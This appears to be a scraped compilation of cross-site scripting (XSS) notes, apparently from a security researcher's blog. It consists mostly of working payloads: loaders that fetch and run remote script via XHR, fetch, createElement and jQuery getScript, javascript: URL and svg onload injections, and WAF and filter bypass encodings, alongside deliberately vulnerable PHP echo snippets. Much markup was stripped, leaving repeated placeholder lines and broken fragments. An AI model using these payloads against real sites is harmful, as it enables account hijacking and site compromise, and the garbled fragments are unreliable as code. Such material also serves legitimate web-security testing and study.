    Calling Remote Script With Event Handlers
    1 – XHR
    "var x=new XMLHttpRequest();x.open('GET','//0');x.send();
    x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
    2 – Fetch
    fetch('//0').then(function(r){r.text().then(function(w){write(w)})})
    3 – Create Element
    with(top)body.appendChild (createElement('script')).src='//0'
    4 – jQuery Get
    $.get('//0',function(r){write(r)})>
    5 – jQuery Get Script
    $.getScript('//0')
    The Easiest Way to Bypass XSS Mitigations
    echo $_GET["p"];
    echo str_replace(" ", "", $_GET["q"]);
    echo $_GET["p"];
    echo str_ireplace("
    http://javascript:alert(1)@brutelogic.com.br/webgun/test.php?p=
    Bypassing Javascript Overrides
    #
    The Shortest Reflected XSS Attack Possible
    Transcending Context-Based Filters
    1) among tags
    2) inside a tag
    3) in a script section
    1) preg_replace("/\/i", "-", $_REQUEST['q']);
    3) htmlspecialchars($_REQUEST['q'], ENT_QUOTES);
    1) 
    2) " href=javascript:alert(1)
    1)  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    protocol://domain/path/page?p= text1  text2 # text3
    previousSibling.nodeValue, document.body.textContent*
    location.search, tagName, nodeName, outerHTML
    textContent, nextSibling.nodeValue, firstChild.nodeValue, lastChild.nodeValue, innerHTML
    location.hash
    Location Based Payloads – Part III
    – Location
    – Location Self
    – Location Self Plus
    before  after # hash
    Before: everything before the tag.
    Itself: anything that uses the tag name.
    Inside: any attribute inside the tag.
    After: everything after the tag until hash.
    Hash: everything after the # sign.
    1) Location
    1.1) Location Itself+After+Hash (tagName+innerHTML+location.hash)
    :/*click me!#*/alert(9)
    :'click me!#'-alert(9)
    1.2) Location Itself+Hash (tagName+URL)
    click me!#%0Aalert(1)
    javascript: + http://domain/page?p=click me!#%0Aalert(1)
    click me!#'-alert(1)
    javascript:"-' + http://domain/page?p=click me!#'-alert(1)
    1.3) Location After+Hash (innerHTML+URL)
    javascript:"-'click me!#'-alert(1)
    javascript:"-'click me! + http://domain/page?p=javascript:"-'click me!#'-alert(1)
    javascript:#%0Aalert(1)
    javascript: + http://domain/page?p=javascript:#%0Aalert(1)
    1.4) Location Itself+After+Hash (tagName+innerHTML+URL)
    cript:"-'click me!#'-alert(1)
    javas + cript:"-'click me! + http://domain/page?p=cript:"-'click me!#'-alert(1)
    cript:#%0Aalert(1)
    javas + cript: + http://domain/page?p=cript:#%0Aalert(1)
    1.5) Location Itself+Before (tagName+previous.Sibling)
    "-alert(1)click me!
    javascript:" + "-alert(1)
    1.6) Location Itself+After+Before (tagName+innerHTML+previous.Sibling)
    "-alert(1)cript:"click me!
    javas + cript:" + "-alert(1)
    1.7) Location After+Itself (innerHTML+outerHTML)
    javascript:1/*click me!*/
    javascript:1/*click me!*/ + 
    javascript:/*click me!
    javascript:/* + 
    1.8) Location After+Before+Itself (innerHTML+previousSibling+outerHTML)
    */"javascript:/*click me!
    javascript:/*click me! + */" + 
    */"javascript:/*click me!
    javascript:/*click me! + */" + 
    1.9) Location After (innerHTML)
    javascript%26colon;alert(1)//
    javascript:alert(1)//
    1.10) Location Inside (name+id)
    javascrip + t:alert(1)
    2) Location Self
    2.1) Location Self Inside
    http://domain/page?p=
    http://domain/page?p=?p=%26lt;svg/onload=alert(1)>
    http://domain/page?p=
    3) Location Self Plus
    3.1) Location Self Plus Itself
    click me!
    http://domain/page?p=click%20me!
    3.2) Location Self Plus After
    %26p=%26lt;svg/onload=alert(1)>
    http://domain/page?p=%26p=%26lt;svg/onload=alert(1)>&p=
    3.3) Location Self Plus Before
    %26p=%26lt;svg/onload=alert(1)>click me!
    http://domain/page?p=%26p=%26lt;svg/onload=alert(1)>click%20me![BODY_CONTENT]&p=click me!
    Location Based Payloads – Part II
    click me!
    click me!#:alert(1)
    click me!#alert(1)
    /*click me!#*/alert(1)
    /*click me!#*/alert(1)
    Result => javascript: + /*click me! + #*/alert(1)
    'click me!#'-alert(1)
    Result => javascript: +'click me! + #'-alert(1)
    'click me!#'-alert(1)
    javascript + :'click me! + #'-alert(1)
    javascrip + t:'click me! + #'-alert(1)
    javas + cript:'click me! + #'-alert(1)
    Location Based Payloads – Part I
    #javascript:alert(1)
    Result => javascript:alert(1)
    #(1)
    Result => javas + cript: + ale + rt + (1)
    #(1)
    Result => javas + script: + ale + rt + (1)
    #()
    Result => javas + cript: + ale + rt + ( + 1 + )
    Filter Bypass Procedure
     #XSS vs WAF
    1) use  pass
     pass
     block
    Event handlers with up to 6 chars:
    oncut, onblur, oncopy, ondrag, ondrop, onhelp, onload, onplay, onshow
    1) Encoding
    " onxxx=1 (mimics a text outside of the tag)
    %22OnXxx%3D1
    Existing Code Reuse
    alert(1)//
    alert(1)
    2) After injection:
    alert(1)//">
    http://brutelogic.com.br/webgun/test.php?p=
    http://brutelogic.com.br/webgun/test.php?p=AAAA
    http://brutelogic.com.br/webgun/test.php?p=AAAA
    XSS Payload Scheme
    click me!
    extra1  extra3
    extra1  extra3
    extra1  extra3
    extra1  extra3 (without spacer2)
    AAAAAAAAA